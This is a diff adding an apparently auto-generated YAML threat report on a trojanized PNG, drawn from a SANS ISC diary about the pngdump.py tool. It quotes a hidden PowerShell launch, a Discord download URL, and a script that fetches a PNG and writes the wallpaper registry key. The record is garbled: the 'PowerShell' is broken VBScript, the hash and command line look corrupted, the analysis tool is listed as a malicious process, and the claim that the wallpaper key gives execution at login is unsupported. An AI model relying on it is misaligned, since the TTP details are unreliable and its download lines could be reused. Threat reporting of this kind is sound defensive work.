@@ -1,0 +1,53 @@
+description: This report analyzes a trojanized PNG file that utilizes pngdump.py to
+  extract an embedded payload containing malicious PowerShell scripts designed for
+  persistence and information gathering.
+attribution: Unknown
+malware_families:
+- Trojan
+TTPs:
+  processes:
+  - pngdump.py
+  - powershell.exe
+  commandline:
+  - C:\\Demo\\pngdump.py -5 11 01412333b36243540010ac8b37d7b28002f c926454500ac8334b66e15ad
+  - powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\user\\AppData\\Local\\Temp\\haly.ps1
+  powershell:
+  - '$s = CreateObject("WScript.Shell")
+    $e = $s.Environment("User")
+    $d = $s.ExpandEnvironmentStrings("%temp%")
+    $x = CreateObject("Microsoft.XMLHTTP")
+    $b = CreateObject("Adodb.Stream")
+    $x.Open "GET", "https://media.discordapp.net/attachments/773093506615722064/798605313278050354/haly.png",
+    False
+    $x.Send with $b .type = 1 ''//binary .open .urite
+    $x.responseBody .savetofile $d + "\\haly.png, 2 ''//overwrite
+    end with $s.RegWrite "HKCU\\Control Panel\\Desktop\\Wallpaper", $d + "\\haly.png
+    objshell.Run %windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystenParameters,
+    1, True'
+  registry_keys:
+  - HKCU\\Control Panel\\Desktop\\Wallpaper
+  network_connections:
+  - executable: powershell.exe
+    destination_address: media.discordapp.net
+    port: ''
+    url: https://media.discordapp.net/attachments/773093506615722064/798605313278050354/haly.png
+  file_activity:
+  - C:\\Users\\user\\AppData\\Local\\Temp\\haly.ps1
+  - C:\\Demo\\pngdump.py
+  - C:\\Users\\user\\AppData\\Local\\Temp\\haly.png
+  persistence:
+  - 'Registry Key Modification: Modifies the HKCU\\Control Panel\\Desktop\\Wallpaper
+    registry key to point to a malicious PNG file, ensuring execution on user login.'
+  - 'RUNDLL32 Execution: Utilizes RUNDLL32.EXE and user32.dll to update system parameters,
+    potentially triggering further actions or maintaining persistence.'
+  pipes: []
+  process_relations:
+  - pngdump.py -> powershell.exe
+IOCs:
+- hash: f014123c33b362d3549016ac8b37d7b28e602fC9264C54569a8834b66e15ad
+- url: https://media.discordapp.net/attachments/773093506615722064/798605313278050354/haly.png
+authors:
+- Didier Stevens
+reference: https://isc.sans.edu/diary/Extracting+With+pngdumppy/32022/#comments
+date_of_publication: June 08, 2025
+file_creation_date: June 08, 2025
